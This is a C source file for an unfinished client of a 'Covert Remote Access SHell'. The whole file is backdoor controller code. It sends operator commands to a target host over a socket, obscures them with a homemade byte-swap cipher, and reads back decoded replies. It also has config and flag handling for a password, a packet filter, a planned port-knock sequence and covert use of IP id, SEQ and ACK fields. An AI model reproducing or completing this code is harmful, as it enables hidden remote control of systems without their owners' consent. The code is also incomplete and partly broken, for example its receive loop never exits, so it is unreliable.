/* * * * * * * * * * * * * * * * * * * *
 *  Source: crash.c:
 * 			Covert Remote Access SHell
 *  Functions:
 *  Date:
 *  Revisions:
 *  Designers:
 *  Programmer: John Warren
 *  Usage:
 *  Notes:
 *
 * * * * * * * * * * * * * * * * * * * */
#include "lcfg.h"
#define BUFSZ 256 //outbound max message

char iter=0;

int main (int argc,char **argv){
	int i,psz, msz,done=0;
	unsigned char rcmd[BUFSZ],sbuf[BUFSZ];
	char * msg = (char *)calloc(BUFSZ, sizeof(char));
	int sockfd, nBytes, ch;
	struct sockaddr_in addr_con;
	int addrlen = sizeof(addr_con);
	addr_con.sin_family = AF_INET;
	addr_con.sin_port = htons(PORT_NO);
	addr_con.sin_addr.s_addr = inet_addr(IP_ADDRESS);

	//read command line
	load_cfg();
	get_args(argc,argv);
	psz=strlen(prf.pass);

	// create connection(tcp,udp,icmp)
	sockfd = socket(AF_INET, SOCK_DGRAM,
					IP_PROTOCOL);

	if (sockfd < 0)
		printf("\nfile descriptor not received!!\n");
	else
		printf("\nfile descriptor %d received\n", sockfd);


 	while (1) {
		msz = getrcmd(msg);
		printf("\n%d %s\n\n",msz,msg);
		if (msz==0 || strncmp(msg, "x", strlen(msg)-1) == 0 || strncmp(msg, "exit", strlen(msg)-1) == 0 || done==1){
			done=1;
			break;
		}
		sprintf(rcmd,"%x%s",msz,msg);

		printf("Unencrypted >>> [%s]\n",rcmd);
	 	// encapsulate message(encrypt, add: len, string) pass, cmd, args
		printf("Encrypted >>> ");
	  for(i=0;i<strlen(rcmd);i++){
	  	sbuf[i]=swapIN(rcmd[i]);
			printf("%c[%x|%x]",rcmd[i],rcmd[i],sbuf[i]);
	  }

		printf("\n");

		// send knock sequence (tbd)
		// send message
		sendto(sockfd, sbuf, BUFSZ,
			sendrecvflag, (struct sockaddr*)&addr_con,
			addrlen);
			// wait for response
		printf("\n--------->  Waiting for response <---------\n");
		while (1) {
			// receive

			nBytes = recvfrom(sockfd, rcmd, BUFSZ,
							sendrecvflag, (struct sockaddr*)&addr_con,
							&addrlen);
			for(i=0;i<strlen(rcmd);i++){
		  	sbuf[i]=swapIN(rcmd[i]);
				printf("%c[%x|%x]",rcmd[i],rcmd[i],sbuf[i]);
		  }
			printf("\n---------Data Received---------\n");
			printf("Unencrypted >>> [%s]\n",sbuf);

		}
		printf("\n-------------------------------\n");

		// decapsulate message (decrypt, parse : len, string) pass, response
		// until done
		// save response to file(cmd_dt.txt)
		//sendcmd(fp,message);
		//getresp()
		//
	}
	// join thread

}

int load_cfg(){
	// printf("\tConfig %s\n", prf.filt);
	FILE *fp;
	char buff[MAXLINE], key[30],value[50];
	int lines=0,i,kv;

	fp = fopen(CONFIG,"r");
	if(fp==NULL){
		return 0;
	}

	while(fgets(buff,MAXLINE,fp)!=NULL){
		if (buff[0] != '\n' && buff[0] != '#'){
			sscanf(buff,"%s %[^\n]\n", key, value);
			//printf("<%s> = %s\n",key,value);
			lines++;
			for(i=0;i<9;i++){
				//  {"sip","dip","tip","proto","sport","dport","tport","filt","pass","prog"};
				if(strncmp(keys[i],key,sizeof(key))==0){
					kv=i;
					// strncpy(kvp[i],value,strlen(value));
					//printf("%d: %s (%s)\n",lines,value,keys[i]);
				}
			}
			switch(kv){
				case 0:
					printf("sip! %s\n", value);
					strncpy(prf.sip,value,12);
					break;
				case 1:
					printf("dip! %s\n", value);
					strncpy(prf.dip,value,12);
					break;
				case 2:
					printf("tip! %s\n", value);
					strncpy(prf.tip,value,12);
					break;				case 3:
					printf("proto! %s\n",value);
					strncpy(prf.proto,value,5);
					break;
				case 4:
					printf("sport! %s\n",value);
					strncpy(prf.sport,value,5);
					break;
				case 5:
					printf("dport! %s\n",value);
					strncpy(prf.dport,value,5);
					break;
				case 6:
					printf("tport! %s\n",value);
					strncpy(prf.tport,value,5);
					break;
				case 7:
					printf("filt! %s\n",value);
					strncpy(prf.filt,value,64);
					break;
				case 8:
					strncpy(prf.pass,value,64);
					printf("pass! %s\n",value);
					break;
				default:
					printf("no match!!!");
					break;
			}
		}
	}
	fclose(fp);
	return lines;
}  // working as defined

unsigned char swapIN(unsigned char x){
    // my cheap form of encryption
    //    printf("%x %x",x, ~x);
     return ( (~x & 0x0F)<<4 | (~x & 0xF0)>>4 );
} // from before

int get_args(int argc, char**argv){
	int count,ipid=0,seq=0,ack=0,src=0,server=0,dest_port=0;
	printf("\nGet arguments (%d)\n",argc);
	for (count=0; count < argc; ++count) {
		 		if (strcmp(argv[count], "-dest_port") == 0) {
            dest_port = atoi(argv[count + 1]);
						printf("\tDest:%d /n",dest_port);
        } else if (strcmp(argv[count], "-ipid") == 0) {
					  printf("\tUse IP id = true\n");
            ipid = 1;
        } else if (strcmp(argv[count], "-seq") == 0) {
					printf("\tUse SEQ = true\n");
            seq = 1;
        } else if (strcmp(argv[count], "-ack") == 0) {
					printf("\tUse ACK = true\n");
            ack = 1;
        } else if (strcmp(argv[count], "-src") == 0) {
					printf("\tuse Source = true\n");
            src = 1;
        } else if (strcmp(argv[count], "-server") == 0) {
					  printf("\tServer = true\n");
            server = 1;
        }
    }
		printf("Arguments: dest: %d IP:%x SEQ: %x ACK:%x SRC:%x SVR:%x\n\n",dest_port,ipid,seq,ack,src,server);
}

int getrcmd(char* message){
		int x;
    printf("\n\n>>> Enter Remote Command to send or 'exit' (<Enter>\n");
		fgets(message, BUFSZ, stdin);
		// printf("\n\t%x Requested: %s \n\n",strlen(message),message);
		x= strlen(message)-1;
		message[x] = '\0';
		return x;
}

void usage(char* prg){
    printf("Program Usage:\n");
    printf("%s -d [destination] -p [port]",prg);
}

// funtion to clear buffer
void clearBuf(char* b){
	int i;
	for (i = 0; i <BUFSZ; i++)
		b[i] = '\0';
}
